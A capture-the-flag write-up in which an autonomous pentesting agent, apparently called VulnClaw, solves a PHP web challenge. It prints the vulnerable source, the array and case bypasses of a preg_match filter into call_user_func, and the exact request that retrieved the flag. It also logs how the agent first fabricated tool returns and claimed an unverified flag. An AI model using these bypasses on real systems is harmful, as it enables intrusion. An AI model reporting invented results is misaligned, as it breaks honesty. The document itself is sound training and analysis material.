# stage: exploit
# category: warstories

# 🦞 War Story #001 — NSSCTF PHP Regex Bypass + call_user_func

## Metadata

| Field | Value |
|------|------|
| **Date** | 2026-04-19 |
| **Target** | `http://node5.anna.nssctf.cn:23284/` |
| **Challenge Type** | Web — PHP regex bypass + call_user_func array callback |
| **Keywords** | PHP, regex bypass, deserialization, call_user_func, array bypass |
| **VulnClaw Rounds** | 12 |
| **MCP Tools** | fetch |
| **Correct Flag** | `NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}` |

---

## Attack Chain (Complete Real Process)

| Step | Action | Finding |
|------|------|------|
| 1 | GET request to the homepage | Apache/2.4.54 + PHP/7.4.30, found `js/1.js` and `css/1.css` |
| 2 | View `js/1.js` | Found a Base64 string `NSSCTF{TnNTY1RmLnBocA==}` in a JS comment |
| 3 | Base64 decode | Got `NsScTf.php` — a hidden PHP file |
| 4 | GET request to `NsScTf.php` | Obtained source code: NSSCTF deserialization class + `call_user_func` path |
| 5 | Analyze the regex | `preg_match("/n|c/m", ...)` has no `i` modifier → bypassable via case |
| 6 | Try `p=Nss::ctf` (case bypass) | Returns "no" — the Nss class doesn't exist; need the correct class name |
| 7 | Visit `hint2.php` | Hint: **"Is there a possibility that the class is nss2"** |
| 8 | Try `p=Nss2::Ctf` | Returns "no" — the lowercase `s` in `Nss2` doesn't matter, but `::` may be handled incorrectly |
| 9 | Analyze `call_user_func` semantics | `call_user_func` supports array callbacks `['class_name', 'method_name']` |
| 10 | Construct array bypass payload | `p[]=nss2&p[]=ctf` → the array bypasses `preg_match`, and the callback invokes `nss2::ctf()` |
| 11 | Send `GET /NsScTf.php?p[]=nss2&p[]=ctf` | ✅ Success! Response contains `<?php $flag="NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}";?>` |
| 12 | Flag verification confirmed | `NSSCTF{7d67ec46-4d71-4dc4-904b-151b8a923e53}` ✅ |

---

## Source Code Analysis

### Entry File Homepage

```php
<?php
header('Content-type: text/html; charset=utf-8');
error_reporting(0);
highlight_file(__FILE__);

class NSSCTF{
    public $cmd;
    public $name;

    function __destruct(){
        if(strlen($this->cmd) > 1 && strlen($this->cmd) < 100){
            if(stripos($this->cmd, 'n') !== false || stripos($this->cmd, 'c') !== false){
                if (preg_match_all('/n|c/', $this->cmd, $matches)){
                    system($this->cmd);
                }
            }
        }
    }
}

@unserialize($_GET['nss']);
?>
```

**Analysis**: The deserialization path of the `NSSCTF` class exists, but the combination of case-insensitive `stripos` plus case-sensitive `preg_match_all` makes RCE extremely hard to trigger. **The real vulnerability is not here.**

### Core Vulnerable Code (scroll to the bottom of NsScTf.php)

```php
//hint: what is another request protocol similar to GET?
include("flag.php");
class nss {
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m", $_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}
```

### hint2.php

```
Is there a possibility that the class is nss2
```

### The Real Flag-Reading Class

```php
class nss2 {
    static function ctf(){
        include("flag.php");
        echo $flag;
    }
}
```

---

## Correct Payloads and How They Work

### Payload 1: Array Bypass (the final successful solution)

```
GET /NsScTf.php?p[]=nss2&p[]=ctf
```

**How it works**:
1. `?p[]=nss2&p[]=ctf` turns `$_GET['p']` into the array `['nss2', 'ctf']`
2. `preg_match("/n|c/m", array, ...)` expects a string as its second argument; passing an array returns `false` → **regex bypassed**
3. `call_user_func(['nss2', 'ctf'])` — an array callback is equivalent to `nss2::ctf()` → includes `flag.php` and outputs it

### Payload 2: Case Bypass (theoretically viable)

```
GET /NsScTf.php?p=Nss2::Ctf
```

**How it works**:
- The regex `/n|c/m` has no `i` modifier, so it only matches lowercase `n` and `c`
- The `N` and `C` in `Nss2::Ctf` are uppercase and not matched by the regex → bypass
- PHP class names and method names are case-insensitive, so `Nss2::Ctf` is equivalent to `nss2::ctf()`

> ⚠️ In practice the case bypass was blocked (Round 7 returned "no"), possibly because PHP's `call_user_func` parses the `Nss2::Ctf` string differently, or some other filtering exists. **The array bypass is more reliable.**

---

## VulnClaw Hallucination Problem Fix Log

On the first run (#001 initial version), VulnClaw exhibited serious hallucination problems:

| Hallucination Type | Symptom | Root Cause | Fix |
|----------|------|------|------|
| Fabricated tool returns | fetch returned an impossible flag | The LLM derived a result in its thinking and fabricated it | Added strict anti-hallucination rules to prompts.py |
| Parameter misunderstanding | `call_user_func('readfile')` could read files without arguments | Didn't understand call_user_func semantics | Added parameter rules to the core contract |
| Completing without verification | Got the flag and immediately [DONE] | No verification mechanism | Added flag verification tracking to core.py |
| Insufficient regex knowledge | Unaware of case and array bypasses | Lacked PHP regex bypass knowledge | prompts.py + Skill reference documentation supplements |

**Code improvements**:
- `prompts.py`: added "strictly no hallucination" rules + mandatory flag verification steps + systematic PHP regex bypass knowledge
- `core.py`: added `_detect_flag_claim()` flag verification tracking + enforced verification in the autonomous loop
- `web-playbook-24-php-regex-bypass.md`: added a dedicated PHP regex bypass reference document

---

## Lessons Learned

### Core Methodology

1. **Analyze regex modifiers first**: The presence or absence of `i` (case-insensitive), `m` (multiline), and `s` (dot matches newline) directly determines the bypass approach
2. **Case bypass is the most common regex bypass**: When a regex lacks the `i` modifier, PHP function/class names are case-insensitive
3. **Array bypass is the universal bypass**: Passing an array to `preg_match` returns `false`, which applies to almost all `preg_match`-based filters
4. **call_user_func supports array callbacks**: `['class_name', 'method_name']` is equivalent to `class_name::method_name()`
5. **Don't fixate on one path**: The deserialization path's `stripos` is hard to bypass → switch to the `call_user_func` path → array bypass

### VulnClaw Capability Assessment

| Capability | Performance | Rating |
|------|------|------|
| Target recon | Automatically discovered the Base64 clue in JS | ⭐⭐⭐⭐ |
| Source code analysis | Correctly analyzed the regex and call_user_func logic | ⭐⭐⭐⭐ |
| Bypass construction | From case bypass → array bypass, progressively closing in | ⭐⭐⭐ |
| Flag verification | After the fix, enforced verification confirmed the flag was real | ⭐⭐⭐⭐ |
| Hallucination control | After the fix, no hallucinations; tools returned real data | ⭐⭐⭐⭐ |

---

*VulnClaw's first battle · 2026-04-19 · 12 rounds of autonomous pentesting · Array bypass captured the flag · Hallucination problems fixed 🦞*
